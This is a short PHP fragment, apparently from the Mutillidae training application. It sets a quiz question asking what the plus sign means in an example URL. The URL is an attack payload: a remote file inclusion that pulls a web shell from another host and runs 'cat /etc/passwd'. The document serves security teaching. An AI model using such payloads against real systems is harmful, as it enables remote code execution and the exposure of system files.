<?php
    ...
    $lQuestion = "In the URL displayed below, what is the purpose of the plus (+) symbol that appears near the end.     http://mutillidae.localhost/index.php?page=http://127.0.0.1:8888/simple-web-shell.php&pCommand=cat+/etc/passwd";
